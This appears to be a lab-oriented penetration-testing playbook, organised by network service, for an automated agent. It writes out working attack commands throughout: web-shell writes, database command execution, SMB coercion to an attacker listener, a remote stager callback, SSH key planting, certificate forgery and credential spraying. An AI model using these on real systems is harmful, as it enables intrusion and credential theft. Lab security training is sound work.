# Per-service playbooks

## SMB (139/445)

```bash
pwnloop x "nxc smb $T"                                  # OS, domain, signing
pwnloop x "nxc smb $T -u '' -p '' --shares"             # null session
pwnloop x "nxc smb $T -u 'guest' -p '' --shares"
pwnloop x "smbclient -N -L //$T/"
pwnloop x "smbclient -N //$T/ShareName -c 'recurse ON; ls'"
pwnloop x "smbmap -H $T -u guest"
```
Signing disabled is a relay opportunity in AD environments. Readable shares:
pull everything and grep for passwords, `.ps1`, `.vbs`, `web.config`,
`unattend.xml`, `Groups.xml` (cpassword), KeePass databases.

```bash
pwnloop x "smbclient -N //$T/Share -c 'prompt OFF; recurse ON; mget *'"
pwnloop x "grep -ariE 'password|pwd|secret|connectionstring' /engagements/$NAME/loot | head -50"
```

RID cycling to enumerate users without credentials:
```bash
pwnloop x "nxc smb $T -u guest -p '' --rid-brute 4000"
pwnloop x "enum4linux-ng -A $T"
```

**Pin the exact Samba version, then run it through *Version → CVEs* below** —
`smbclient`/`rpcclient` banners and `nxc` give `4.x.y`; "Samba 4" is not a
version. Recurring Samba exploit classes to check the version against: an
**untrusted config value reaching a shelled-out command** — the printing path is
the classic one, where a `print command`/`printcmd` template runs with
attacker-influenced fields (the SPOOLSS `document_name` is a real sink, not just
the client-side filename), so a spoolss job becomes command injection; symlink /
`wide links` + `force user` for cross-user read/write; and stale RCEs on old
`smbd`. Read the mechanism from the advisory/PoC and confirm the actual sink
before assuming which field is injectable.

**A bug in the *authentication* path may be unreachable with a modern client —
that is a delivery problem, not a patched target.** Whenever the injectable
field is one the client negotiates *around* (a username, a domain, a workstation
name), stock `smbclient` and impacket will pack it into an NTLMSSP/SPNEGO blob,
where metacharacters sit inside a structured field and never reach a shell. The
symptom is indistinguishable from "not vulnerable": a clean `NT_STATUS_LOGON_FAILURE`
and no side effect. Do not park the lead on that evidence alone.

Diagnose it in this order:
1. **Confirm the precondition on the target**, not from the version. If you have
   any other exec primitive, read the config and look for the directive that
   makes the sink reachable at all (for the username-map class, a
   `username map script` line in `smb.conf`). Precondition present + version in
   range = the vuln is live and you have a delivery bug.
2. **Do not bother with the legacy client knobs.** `client use spnego = no`,
   `client ntlmv2 auth = no`, `client lanman auth = yes` are *accepted and
   ignored* by current Samba — it prints a deprecation warning and negotiates
   modern auth anyway. Reading those warnings as cosmetic costs real time.
3. **Emit the raw exchange yourself.** For SMB1 this is ~60 lines of socket
   code: NEGOTIATE offering only `NT LM 0.12`, then a **non-extended
   `SESSION_SETUP_ANDX` (`WordCount 13`)** with the `EXTENDED_SECURITY` bit
   (`0x0800`) clear in `flags2` and `AccountName` as a plain null-terminated
   string. That is the only shape in which the field reaches the server's
   `smbrun()`-equivalent verbatim.
4. **Confirm with a side-effect oracle, never the response.** These bugs run the
   command and *then* reject the login, and there is no output channel — so a
   failure status is the success case. Have the payload write a file, sleep a
   measurable interval, or call back, and check that instead.

The generalisation beyond SMB: the older the auth-path bug, the more likely your
client has evolved past being able to express it. When a well-evidenced legacy
exploit "fails", suspect your client before you conclude the target is patched.
*(lame: Samba 3.0.20 CVE-2007-2447, dead via smbclient and impacket, delivered
in one exchange by hand-built SMB1)*

## FTP (21)

```bash
pwnloop x "ftp -n $T <<< $'user anonymous anonymous\nbinary\nls -la\nprompt off\nmget *\nbye'"
```
Check whether the FTP root is also the web root — an upload there is instant
RCE. Note the server version; vsftpd/ProFTPD have famous backdoored builds.

## SSH (22)

Record the version. Do not brute force. Once you have any username list plus a
password from elsewhere, spray it. Private keys found on disk go in `loot/`,
`chmod 600`, then `ssh -i`. Passphrase-protected keys:
```bash
pwnloop x "ssh2john id_rsa > /engagements/$NAME/loot/key.hash && john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/key.hash"
```

**Before cracking a passphrase, check whether there is one.** Base64-decode the
first line of the key body: after the `openssh-key-v1\0` magic come the cipher and
KDF names, and `none`/`none` means the key is unencrypted. One command instead of
a wordlist — and it stops you attributing a *permissions* win to a cracking win.

**An sshd refusal does not rule out password reuse — `su` tests the real Unix
password even when sshd won't.** A recovered web/app password that sshd rejects
(pubkey-only, `AllowUsers`, `Match` jail, or the account simply not permitted)
can still be the account's local password: `su - <user>` goes through PAM against
`/etc/shadow`, a different gate. Don't conclude reuse is dead from an SSH refusal.
From a non-TTY web/reverse shell, drive it with a tiny PTY harness that answers
the prompt and writes output somewhere you can read it back:

```bash
python3 -c 'import pty,sys; pty.spawn(["su","-",sys.argv[1],"-c","id;cat ~/.ssh/id_* 2>/dev/null"])' <user>
```

**Polling SSH before the key is planted trips fail2ban and bans your *source IP
for every account* — and kills any tunnel on that IP.** The symptom is
`kex_exchange_identification: Connection reset`. So confirm a foothold succeeded by
polling a **world-readable oracle the payload writes** (a `/tmp` file, an HTTP
endpoint) — never by repeatedly SSHing to the target account — and only SSH once
the key is known planted. If you do get banned, reconnect the VPN for a fresh
source IP.

**Read `sshd_config` and its drop-ins as an attack surface, not as trivia.**
`/etc/ssh/sshd_config.d/*.conf` is where labs put the interesting deviation:

- `TrustedUserCAKeys <path>` — sshd accepts **certificates** signed by that CA.
  Now find who can read the CA's *private* key (usually the same path without
  `.pub`). If any account you can reach can read it, that account is root:

  ```bash
  ssh-keygen -t ed25519 -N "" -f k
  ssh-keygen -s /path/to/ca -I anything -n root -V -5m:+2h k.pub
  ssh -i k -o CertificateFile=k-cert.pub root@target
  ```

  Two conditions decide whether it works, and both are readable in the config:
  **no `AuthorizedPrincipalsFile`/`AuthorizedPrincipalsCommand`** means a
  certificate may claim any principal, and `PermitRootLogin prohibit-password`
  does *not* exclude root — it permits root by key or certificate. Backdate the
  validity (`-V -5m:...`), because a certificate that becomes valid "now" is
  rejected on any clock skew and the failure is indistinguishable from an
  untrusted CA.
- `Match User`/`ForceCommand internal-sftp`/`ChrootDirectory` — a jail for
  *commands* only. **TCP forwarding is a separate switch**: if the block omits
  `AllowTcpForwarding no` (the global default is `yes`), the account can still
  `ssh -L`/`-D` onto the box's **localhost-only** services even with no shell and
  a chroot. That is often the intended way to reach an internal admin panel or a
  debugger from an SFTP-only login (see the Node `--inspect` entry below). A
  complete jail needs `AllowTcpForwarding no` + `AllowStreamLocalForwarding no` +
  `PermitOpen none`. Also look for the web or file-write surface the jail doesn't
  cover.
- `PasswordAuthentication yes` on a box that documents certificate auth is a
  leftover, and it is exactly where a leaked service-account password lands.

This is a custody failure, not a protocol one: an SSH CA is root-equivalent for
every host that trusts it, so the finding to lead a report with is that the
signing key was readable by the accounts authenticating *with* it.

## Node.js `--inspect` / V8 inspector (9229+, usually 127.0.0.1)

A Node process started with `--inspect[=host:port]` (visible in `ps`, a systemd
unit, or `/proc/self/environ`) exposes the Chrome DevTools protocol —
**unauthenticated RCE inside the app process** for anyone who can reach the port.
It is a production own-goal (leftover debug flag) and is normally bound to
loopback, so you reach it through a forward — an SFTP-only SSH account that still
permits TCP forwarding is a common carrier (see SSH above).

`GET http://host:9229/json` → `webSocketDebuggerUrl`. Open that WebSocket and
send `{"id":1,"method":"Runtime.evaluate","params":{"expression":"<JS>",
"returnByValue":true,"awaitPromise":true}}`. Node hands you `require`:
`process.mainModule.require('child_process').execSync('id').toString()`. Gotcha: a
live app floods `Runtime.consoleAPICalled` events, so **keep reading frames until
you see your own `id` reply** rather than capping the frame count (a fixed-N loop
returns nothing and reads like a dead endpoint). A ~90-line raw-socket WS client
is enough; no library needed.

## Telnet (23)

Telnet is rare on modern boxes, so a telnetd — **especially a custom build, or
one bound to `127.0.0.1` behind inetd/xinetd and running as root** — is almost
always deliberate. `dpkg -S` finding no owning package + a binary under
`/usr/libexec` or `/usr/local/sbin` means it was planted at a chosen version.
Pin that version exactly (`telnetd --version`; `strings` often leaks the build
path/source tree) and treat it like any version-pinned service: enumerate its
CVEs and reason about them (see *Version → CVEs* below). The general moves worth
knowing: telnetd hands the session to `login`, so look at (1) how client-supplied
data (`USER`/env via NEW_ENVIRON, term type) reaches `login`'s argv — argument
injection there is an auth bypass — and (2) option-negotiation parsers (LINEMODE
/ SLC), a classic memory-corruption surface. When a daemon exposes both, the
logic/auth-bypass bug is usually the intended, reliable door; confirm the
memory-corruption primitive by reversing before committing to exploit-dev.

## Version → CVEs (do this for every pinned service)

Pinning the version is step one; the reasoning is the point:

- **Enumerate *all* the CVEs for that exact product+version, not the first hit.**
  A single daemon commonly has several current CVEs at once. `searchsploit` +
  vendor advisory + NVD + a GitHub search (`gh search repos/code "CVE-…"`).
- **When there are several, weigh and choose.** Rank by cost and reliability, not
  by CVSS: an auth bypass / argument injection / logic flaw beats a
  memory-corruption bug on a hardened (PIE/ASLR/RELRO/canary) target. Read each
  advisory's *references* for a weaponized PoC before assuming you must build one.
- **Chain when the box wants it.** Two CVEs can be a foothold + a privesc, or a
  leak feeding an exploit — hold the whole set in view rather than tunnelling on
  one.
- **Reverse before hand-rolling.** For a memory bug, check the actual primitive
  (arbitrary vs linear write, mitigations, whether a public 64-bit exploit even
  exists) before spending hours — the intended path is often a cheaper bug in the
  same binary.
- **A blocked *precondition* is not a dead-end — it is the signal to re-hunt.**
  The most expensive failure mode is locking onto the first CVE you find and
  fighting a precondition you can't satisfy: an approval/review gate on a CI or
  forge action, a required sudoers rule, a role you don't hold, a patched sink,
  an auth requirement with no approver. Before concluding "no path", go back and
  enumerate the *other* CVEs for that exact version. The intended door is
  frequently a **sibling CVE with a completely different trigger** — a
  logic/race flaw where you were stuck on an approval flaw, an unauthenticated
  event where you were blocked on auth, a second bug in the same product that
  needs no privilege at all. This is doubly true for web apps, forges and CI
  platforms, where one product version often ships several unrelated advisories.
  Re-hunting costs minutes; fixating on one gated CVE has cost whole runs. When
  you catch yourself repeatedly working around the *same* wall, that is the cue
  to widen the CVE search, not to dig harder.

## DNS (53)

```bash
pwnloop x "dig axfr @$T machine.htb"                # zone transfer
pwnloop x "dnsenum --dnsserver $T machine.htb"
```
A successful AXFR usually hands you every vhost on the box.

**A writable authoritative server is a trust-forging primitive, not just a map.**
If you can add records to the zone the *target* resolves against, you can become
any name that target trusts — the payoff lands wherever authentication is anchored
to a hostname (`.rhosts`/`hosts.equiv` and the r-services below, `known_hosts`
`CanonicalizeHostname`, TLS/Kerberos SPN checks, IP-allowlists resolved by name).
Write vectors, in order of how often they show up on a lab: unauthenticated
**RFC2136** dynamic update (`nsupdate`, frequently allowed only from the internal
subnet — send it from a foothold container, not from the VPN); the DNS product's
**own admin/API** (PowerDNS-Admin, PowerDNS HTTP API with the key from its
`setting` table, BIND rndc); or writing the **backend store** directly (PowerDNS
gmysql `domains`/`records`). Two things bite after the write: many resolvers want
**forward-confirmed reverse DNS** (you need the `PTR` *and* the matching forward
`A`, not just one), and authoritative servers **cache** — flush it
(`pdns_control purge`, PowerDNS API `PUT .../cache/flush?domain=`) or wait out the
TTL, or your record is correct in the DB and still invisible on the wire.

## Berkeley r-services — rexec/rlogin/rsh (512/513/514)

Open r-services are almost never accidental; they signal `.rhosts`/`hosts.equiv`
**host-based trust** as the intended path. `rshd`/`rlogind` authorise a peer by
resolving the *client IP back to a hostname* and testing that name against the
trust file — so the exploit is a name you control, not a password.

```bash
pwnloop x "cat ~/.rhosts /etc/hosts.equiv 2>/dev/null"   # once you have any shell
# '<host> +' means: from <host>, any user logs in with no password
```

The move when `/root/.rhosts` trusts a name like `admin.corp`:
1. Point that name at your address in the zone the target resolves — forward
   `A admin.corp → <your IP>` **and** reverse `PTR <your IP> → admin.corp`
   (forward-confirmed reverse DNS; the forward record alone gets you
   `getnameinfo: temporary failure` and a rejection). Flush the DNS cache.
2. Confirm both directions from the target's resolver
   (`dig -x <your IP> @<ns>` must return the trusted name), then connect as the
   trusted user. `rsh`/`rlogin` bind a privileged source port, so run as root;
   if no client is installed, the wire protocol is trivial
   (`\0localuser\0remoteuser\0cmd\0` to 514) — a ~20-line Python client works.
   *(Example: on build.vl this yielded `rsh -l root` = uid=0 on the host.)*

## SNMP (161/udp)

```bash
pwnloop x "onesixtyone $T -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
pwnloop x "snmpwalk -v2c -c public $T | tee /engagements/$NAME/scans/snmp.txt"
pwnloop x "snmpwalk -v2c -c public $T 1.3.6.1.2.1.25.4.2.1.2"   # running processes
```
Process listings frequently contain credentials passed on the command line.

## IPsec / IKE (500/udp, 4500/udp NAT-T)

An ISAKMP responder is a **pre-authentication credential oracle** whenever it
will negotiate IKEv1 Aggressive Mode. Treat 500/udp the way you treat an
anonymous SMB share: something to interrogate before you have any credential.

**Why the mode is the whole question.** IKEv1 Main Mode takes six messages and
sends identities and the authentication payload only *after* a Diffie-Hellman
key exists, so they are encrypted. Aggressive Mode compresses this to three, and
pays for it by putting the responder's nonce, DH public value, **identity** and a
**hash derived from the PSK** in the first reply — before the initiator has
proven anything. So if the server speaks it, anyone who can reach the port can
request offline-crackable authentication material, anonymously and repeatedly.

```bash
pwnloop x "ike-scan -M $T"        # Main Mode: what is the proposal?
pwnloop x "ike-scan -M -A $T"     # Aggressive Mode: does it answer at all?
pwnloop x "ike-scan -M -A --pskcrack=/engagements/$NAME/loot/ike-psk.txt $T"
pwnloop x "psk-crack -d /usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/ike-psk.txt"
```

Read the whole handshake, not just the hash — the `ID` payload is often the more
valuable half:

- `ID(Type=ID_USER_FQDN, Value=<user>@<host>)` hands over an **internal hostname
  and a valid username** with no credential. Add the hostname to the container's
  `/etc/hosts` immediately and carry the username into every later spray.
- `VID=...(XAUTH)` means a second, user-level credential layer exists behind the
  PSK — the PSK is the group secret, not the whole door.
- A weak proposal (`3des-sha-modp1024`) is a finding in its own right for the
  report even when the PSK falls to a dictionary first.

**The PSK is a string somebody chose, so test it as a password.** The recurring
finish is not building a tunnel at all: the recovered PSK is tried as the UNIX /
service password of the account the `ID` payload just named. A VPN group secret
and a login password are different classes of secret that people routinely set to
the same value. Spray it one account at a time — never a list — since `fail2ban`
is commonly present.

If the PSK does not crack and you do need the tunnel, `strongswan`/`ipsec` with
the recovered PSK gets you a Phase 1; XAUTH credentials are then the next target,
and `ike-scan --id=<group>` enumerates valid group names by which IDs draw a
handshake.

Also sweep the other UDP services that cluster on network-appliance hosts —
**69/udp TFTP** in particular. An anonymous TFTP root often serves device
configuration (`*.cfg`, `*-confg`, `running-config`), which is a credential file
by design: `enable` secrets, SNMP communities, VPN keys.

```bash
pwnloop x "tftp $T -c get ciscortr.cfg"     # names are guessable/enumerable
```

Note that a config whose passwords are all `*****` is set dressing, not a
credential source — record it `DEAD` with that reason and move on.

## Kerberos (88)

An open `88` = a KDC = you can enumerate and spray users with **no credential**
via pre-auth. Reach for `kerbrute` first (built in; see `references/ad.md`):

```bash
pwnloop x "kerbrute userenum -d <domain> --dc $T /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
```
It also surfaces AS-REP-roastable accounts as it goes. Mind the lockout policy.

## LDAP (389/636)

```bash
pwnloop x "ldapsearch -x -H ldap://$T -s base namingcontexts"
pwnloop x "ldapsearch -x -H ldap://$T -b 'DC=machine,DC=htb' | tee /engagements/$NAME/scans/ldap.txt"
```
Grep the dump for `description`, `userPassword`, `info` — admins park passwords
in those fields constantly.

## NFS (2049)

```bash
pwnloop x "showmount -e $T"
pwnloop x "mkdir -p /mnt/nfs && mount -t nfs $T:/export /mnt/nfs -o nolock"
```
`no_root_squash` on an export means you can drop a SUID root binary there and
execute it on the target.

**When `mount` fails with `Operation not permitted`** the container lacks
`CAP_SYS_ADMIN` — don't give up on NFS, switch to a **userspace client**
(`libnfs-utils`: `nfs-ls`, `nfs-cat`, `nfs-cp`), which needs no mount **and lets
you choose the UID/GID per request**:

```bash
pwnloop x "nfs-ls  'nfs://$T/home/<user>?uid=<uid>&gid=<gid>'"   # read a drwxr-x--- home
pwnloop x "nfs-cat 'nfs://$T/home/<user>/.bash_history?uid=<uid>&gid=<gid>'"
```

An export carrying only `root_squash` (the default) squashes *client uid 0* to
`nobody` but **trusts every other client-asserted UID** — so you can become any
non-root user and read their files. Get the target UID from `/etc/passwd` (often
world-readable, or recoverable from a backup on another export). `/root` stays
unreadable because uid 0 is the one uid that *is* squashed.

## MySQL (3306) / MSSQL (1433) / PostgreSQL (5432)

```bash
pwnloop x "mysql -h $T -u root -p''  -e 'show databases;'"
pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -q 'SELECT @@version'"
pwnloop x "nxc mssql $T -u sa -p 'password' --local-auth -X 'whoami'"   # xp_cmdshell
```
MySQL with FILE privilege: `SELECT LOAD_FILE('/etc/passwd')` and
`SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'`.

**PostgreSQL superuser is OS command execution** as the `postgres` user — check
`SELECT rolsuper FROM pg_roles WHERE rolname=current_user` first, then:

```sql
CREATE TABLE c(l text);
COPY c FROM PROGRAM 'id';   -- runs the command; SELECT * FROM c to read stdout
```

`pg_read_file()`/`lo_export` read/write files as `postgres`. How you *reach* the
server matters: `pg_hba.conf` `local ... trust` means a connection over the UNIX
socket is superuser with no password even when TCP requires SCRAM — forward a
port to that socket (see `pivoting.md`) and you inherit the trust. When egress is
filtered, read command output back through a table via `COPY`/`SELECT` rather than
a reverse shell.

**MSSQL with no privileges at all is still a credential primitive.** A login
mapped to `guest` with no readable databases can usually still run the
directory extended procedures, which make the *SQL service account*
authenticate outbound to a UNC path you choose:

```bash
# listener first
pwnloop x "python3 -u /usr/share/doc/python3-impacket/examples/smbserver.py share /engagements/<e>/www -smb2support"
# then coerce — vary the share name on every retry, Windows negative-caches it
pwnloop x "impacket-mssqlclient user:pass@$T <<< 'EXEC master.sys.xp_dirtree \"\\\\<tun0-ip>\\pwn01\", 1, 1;'"
```

`xp_dirtree`, `xp_fileexist` and `xp_subdirs` are all executable by `public` by
default. The result is a NetNTLMv2 for the service account — crack it offline
(`john --format=netntlmv2`), it cannot be relayed to a DC with signing
required. If the listener prints nothing, do not assume failure: see
`foothold.md` on reading the hash off the wire.

**A low-privilege MSSQL login is usually one grant away from more — enumerate the
impersonation/ownership graph before concluding you're stuck.**

```sql
-- who can you become?
SELECT pr.name grantee, pr2.name grantor FROM sys.server_permissions pe
  JOIN sys.server_principals pr  ON pe.grantee_principal_id=pr.principal_id
  JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id
  WHERE pe.permission_name='IMPERSONATE';
EXECUTE AS LOGIN='<other>';   -- become it; REVERT to step back
```

Escalation classes, cheapest first:
- **IMPERSONATE chain** — a login you can become may itself impersonate another,
  or be `sysadmin`; `EXECUTE AS LOGIN='sa'` the moment any hop is sysadmin.
- **TRUSTWORTHY + db_owner** — if you are (or can impersonate) db_owner of a
  TRUSTWORTHY database owned by a sysadmin (`msdb` is TRUSTWORTHY by default),
  a proc `WITH EXECUTE AS OWNER` that runs `sp_addsrvrolemember` grants sysadmin.
  Check `is_trustworthy_on` per DB and `IS_MEMBER('db_owner')` in each.
- **Non-sysadmin xp_cmdshell is a decoy trap.** A login with only *EXECUTE* on
  `xp_cmdshell` (not sysadmin) runs under the `##xp_cmdshell_proxy_account##`
  credential. `EXECUTE permission denied` = no grant; `LogonUserW ... 1326` = the
  grant exists but the proxy password is stale — unfixable without sysadmin, so
  don't tunnel on it, escalate by another class instead.

**When SMB/LDAP are firewalled, MSSQL is your domain-enumeration oracle** — even a
`guest` login resolves directory principals with no AD port open:
- `nxc mssql $T -u <u> -p <p> --local-auth --rid-brute` cycles the domain RID
  space through the SQL connection → full user list.
- `SELECT SUSER_SID('<DOM>\<name>')` is non-NULL only for principals that exist →
  a credential-free username-existence oracle that also distinguishes a real
  domain account from a local SQL login (the latter resolves NULL).

**A linked server is a stored credential — capture the login by hijacking the
name it dials.** Enumerate them from any MSSQL foothold (`enum_links`, or
`SELECT * FROM sys.servers`), then check how each one authenticates and whether
its target actually resolves:

```bash
pwnloop x "impacket-mssqlclient user:pass@$T -port <p> -windows-auth <<< 'enum_links'"
# for a link SQLNN: does its datasource resolve? nslookup <link>.<domain> <dc>
```

Two distinct wins depending on the auth mode:
- **SQL authentication** — the remote login is a username+password the local
  instance replays outbound. If you can make that name point at *you* (an AD zone
  where any authenticated user can `add dnsRecord`, or a hosts/WINS gap), stand up
  a rogue MSSQL listener — Responder's `SQL = On` handler does it — and trigger
  the link (`EXEC ('SELECT 1') AT [LINK]`). The captured password is **cleartext**
  in Responder's `MSSQL-Cleartext-*` log, not a hash to crack.
- **Windows/self-mapping (`RPC OUT`)** — `EXEC (...) AT [LINK]` runs SQL on the
  far side as *its* context; chain to `xp_cmdshell` if the remote login is
  privileged. A link that self-maps to a sysadmin is lateral RCE. The link can
  point into a **separate forest** (watch the DNS suffix of the datasource) — a
  guest on one DC's SQL becomes sysadmin RCE on another forest's DC.
  - Enabling `xp_cmdshell` over a link fights nested quoting: `EXEC ('sp_configure
    ...; RECONFIGURE') AT [LINK]` mangles the doubled quotes. Use **four-part
    naming** for the config calls and a separate `EXEC (N'RECONFIGURE') AT [LINK]`:
    `EXEC [LINK].master.dbo.sp_configure 'show advanced options',1` then
    `... 'xp_cmdshell',1`. Then run commands with the nested form
    `EXEC (N'EXEC xp_cmdshell ''whoami''') AT [LINK]`. Driving this from a tiny
    impacket `tds` script (build the query in Python) beats escaping through
    `nxc -q`/bash.

The class here: *a service that dials a name you can define is a credential/relay
primitive.* A linked server pointed at an NXDOMAIN host is the tell — the box
wants you to create the record. (See the AD DNS write note in `ad.md`/`local.md`.)

## Redis (6379)

```bash
pwnloop x "redis-cli -h $T info; redis-cli -h $T keys '*'"
```
Unauthenticated Redis → write an SSH key into a user's `authorized_keys`, or a
web shell into the web root, via `CONFIG SET dir` + `CONFIG SET dbfilename`.

## WinRM (5985/5986)

```bash
pwnloop x "nxc winrm $T -u user -p pass"
pwnloop x "evil-winrm -i $T -u user -p pass"
pwnloop x "evil-winrm -i $T -u user -H <ntlm-hash>"
```
The fastest route to an interactive Windows shell once you hold credentials.

## RPC (135/593)

```bash
pwnloop x "rpcclient -U '' -N $T -c 'enumdomusers'"
pwnloop x "rpcclient -U '' -N $T -c 'querydispinfo'"
```

## MQTT (1883, 8883/TLS)

A message broker on a server that has no business running one — a domain
controller, say — is worth more than any web port on the same host. Brokers are
routinely deployed with anonymous access on both read *and* write.

```bash
pwnloop x "nmap -p1883 --script mqtt-subscribe $T"
pwnloop x "mosquitto_sub -h $T -p 1883 -t '#' -t '\$SYS/#' -v"      # everything
pwnloop x "mosquitto_pub -h $T -p 1883 -t 'some/topic' -m 'x' -d"   # write test
```

Subscribe to `#` *and* `$SYS/#` — the second is the broker's own status tree and
leaks connected client IDs, source addresses and usernames. Telemetry payloads
routinely carry internal hostnames, IP ranges and health-check URLs, which is a
free network map from an unauthenticated position.

If publishing is allowed, check whether anything *consumes* what you write before
building on it: a topic whose payload contains a `url` field is only a coercion
primitive if some agent fetches it. Publish a URL pointing at your listener and
watch — if nothing calls back, the topics are publish-only telemetry and writing
to them buys you nothing.

## OPC UA (4840) — OT/ICS

An industrial-automation box (SCADA/HMI/PLC theme) almost always exposes an OPC UA
server, often on `127.0.0.1:4840` reachable only after a foothold. Like MQTT, lab
deployments routinely allow **anonymous read *and* write**. Tunnel it back and drive
it with python `asyncua` (`pip install asyncua`; or `python3-asyncua`):

```python
from asyncua import Client, ua
c = Client("opc.tcp://127.0.0.1:4840/<path>/")   # path from the HMI page / banner
async with c:
    for ch in await c.nodes.objects.get_children():
        # walk only NamespaceIndex>0 (the vendor 'urn:*:ot' namespace); ns=0 is huge/standard
        ...
    n = c.get_node("ns=2;i=6")
    print(await n.read_value(), await n.get_user_access_level())   # access w/ CurrentWrite = writable
    await n.write_value(ua.DataValue(ua.Variant(14.0, ua.VariantType.Double)))
```

How to *reason* about it, not a recipe:

1. **Enumerate every variable's access level, not just its value.** `get_user_access_level()`
   returning a set containing `CurrentWrite` (bit 1) is the whole game — that node is your
   actuator. Read-only sensors are noise; find the writable ones (calibration, mode,
   setpoints, override flags).
2. **Look for a value that is *derived* from a writable one.** The intended bug is usually
   that a read-only "effective" reading is computed as `raw_sensor + writable_offset`
   (calibration), or a setpoint the logic trusts. You can't write the sensor, but you can
   write the offset — so you fabricate a reading the physical sensor never produced.
3. **Find who consumes the fabricated value.** A separate *root* process (a "safety"/monitor
   daemon) reacting to the value is the privesc: it will take a privileged action (open a
   maintenance window, write a state file, run a script) on a condition you just forged.
   Read that daemon's logic (or the HMI source that renders the same model) to learn the
   exact threshold and what the action is. The pivot is then a normal local privesc
   (e.g. a `sudo` entry gated on the state file it writes).

The transferable class: *an unauthenticated control-plane whose integrity a higher-privilege
component trusts.* Same shape as an anonymous MQTT broker whose payloads coerce an agent, or
a message queue a root worker drains. Fix in the report is auth/signing on the OPC UA
endpoint and having safety logic read the raw sensor, not the calibrated value.

## SMTP / IMAP / POP3 (25/587/143/110/993/995)

```bash
pwnloop x "nc -nv $T 25"                                   # banner, then VRFY/EXPN
pwnloop x "smtp-user-enum -M VRFY -U users.txt -t $T"      # user enumeration
pwnloop x "swaks --to a@$T --from b@x --server $T --body 'test'"  # open relay / phishing
```
Internal SMTP that accepts mail is a phishing/second-order-XSS vector when a
human or bot reads it. Read any mailbox you get creds for — passwords land in
inboxes.

**Mail as a delivery channel to an automated document opener.** When a site says
"email your CV/invoice/document to `x@dom`" and `RCPT TO:<x@dom>` is accepted
unauthenticated, a bot on the host opens what you send. That makes SMTP a foothold
delivery mechanism for a client-side document CVE, and the win is *not* a document
macro (usually disabled). Method:
1. **Confirm the opener and egress cheaply first.** Send the document with an
   external reference (an image `xlink:href` / linked frame pointing at your HTTP
   listener). A fetch on open proves the doc is rendered and that egress works,
   *independently* of whether code ran — so a later "no callback" tells you the
   payload failed, not that nobody opened it.
2. **Pin the office suite and hunt open-on-load CVEs**, not just macro settings.
   For LibreOffice the class is a `macro:`-scheme dispatch of a *built-in* function
   from a document event (e.g. an `office:load-finished` listener) that fires with
   no macro-security prompt — a different mechanism from a document Basic macro,
   so it survives "macros disabled". Read the CVE/PoC for the exact XML sink, then
   deliver a native-LOLBin command (see `references/evasion.md` for AppLocker).

**hMailServer (Windows) is a recurring privesc pivot.** It runs as **LocalSystem**
and keeps secrets on disk:
- `hMailServer.ini` → `[Security] AdministratorPassword` is an **unsalted MD5**
  (crack it) and `[Database] Password` is a Blowfish blob decryptable with the
  hardcoded key `THIS_KEY_IS_NOT_SECRET`. The admin password is the mail-server
  admin, *not* necessarily the Windows account — test scope before assuming reuse.
- The MSSQL-CE `hMailServer.sdf` is encrypted at rest (no readable table/row
  strings) — that absence itself is the tell.
- The real lever is often a **server-side event script** (`Events\EventHandlers.vbs`)
  that runs as SYSTEM on incoming mail. If any active handler builds a filesystem
  path from an attacker-controlled field (e.g. `saveas("…\" & attachment.filename)`),
  a path-traversal filename (`..\..\inetpub\wwwroot\shell.aspx`) is an **arbitrary
  file write as SYSTEM** — see `references/privesc-windows.md` for turning that
  write into execution. Note the script is compiled at service start; overwriting
  the `.vbs` does nothing until a reload you usually cannot trigger, so exploit the
  handler that is *already loaded* rather than trying to replace it.
The transferable class: *a service running as SYSTEM whose server-side logic trusts
a client-supplied path or value.* Same shape as a print processor, a backup job, or
a queue worker that names files from the message.

## rsync (873)

```bash
pwnloop x "rsync --list-only rsync://$T/"                  # list modules
pwnloop x "rsync -av rsync://$T/<module>/ loot/rsync/"     # pull, often anon
pwnloop x "rsync -av loot/key.pub rsync://$T/<module>/home/user/.ssh/authorized_keys"
```
A writable module mapped into a home directory = SSH key write.

## Java surfaces — RMI / JMX / JDWP (1099/1090/9010/8000/…)

- **RMI/JMX** (`1099`, `9010`, or any port whose `rmi-dumpregistry` shows a
  bound `jmxrmi` → that is a JMX server) → the first question is always *does it
  require auth*, and `beanshooter enum <host> <port>` answers it with no
  credentials. If it enumerates, the service is open. Two payoffs, in order:
  1. **Read MBeans for secrets before any exploit.** On a Tomcat JVM the
     `Users:type=User` / `UserDatabase` MBeans hand back the realm users'
     passwords in *cleartext* (`beanshooter enum` prints them) — even when the
     Manager web app itself is IP-restricted, so don't stop at the 403.
  2. **RCE via a command MBean.** `beanshooter tonka deploy <host> <port>
     --stager-url http://<YOUR-IP>:<port> --stager-host <YOUR-IP> --stager-port
     <port>` registers a TonkaBean through the MLet loader; then `tonka exec
     <host> <port> --shell /bin/sh "<cmd>"`. Gotchas that read as "not
     vulnerable": `--stager-url` is a **deploy-only** flag (not on `exec`); the
     stager HTTP server must bind an address the *target* can reach back to (your
     VPN/tun0 IP, and the deploy silently needs egress to it — if the target
     can't call out, deploy never lands); and `exec` runs an argv array, so pass
     `--shell` to get a real shell for pipes/`;`. Undeploy in cleanup: `tonka
     undeploy` + `undeploy <host> <port> DefaultDomain:type=MLet`.
  Older tooling: `mjet`/`sjet` do the same MLet trick; `nmap --script
  rmi-dumpregistry` is only for the initial fingerprint.
- **JDWP** (`8000` and friends, banner `JDWP-Handshake`) → remote debugger =
  direct RCE: `jdwp-shellifier.py -t $T -p 8000 --cmd 'id'`.

## App servers — Tomcat / Jenkins / JBoss / WebLogic

- **Tomcat manager** (`/manager/html`, `/host-manager`) → default creds
  (`tomcat:tomcat`, `admin:admin`), then deploy a `.war` webshell:
  `nxc … ` or `curl -u user:pass -T shell.war "http://$T:8080/manager/text/deploy?path=/s"`.
- **Jenkins** → `/script` Groovy console = RCE (`"id".execute().text`); unauth
  build config or `@ASYNC` on old versions; read `/credentials.xml` +
  `master.key`+`hudson.util.Secret` to decrypt stored creds.
- **JBoss/WildFly** → JMX console / `jexboss`. **WebLogic** → T3 and CVE
  deserialization (`10.3`/`12.x`).

## Apache Guacamole — the connection store is a credential vault

Guacamole (`/guacamole/`, often on a Tomcat) is a clientless RDP/SSH/VNC gateway,
